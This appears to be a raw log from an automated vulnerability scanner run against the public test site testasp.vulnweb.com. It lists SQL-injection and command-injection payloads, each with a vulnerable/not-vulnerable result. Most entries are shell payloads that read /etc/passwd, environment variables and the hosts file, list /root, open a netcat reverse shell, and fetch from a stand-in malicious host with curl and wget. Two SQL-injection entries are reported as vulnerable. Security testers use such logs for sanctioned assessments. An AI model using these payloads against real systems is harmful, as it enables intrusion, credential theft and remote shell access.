URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
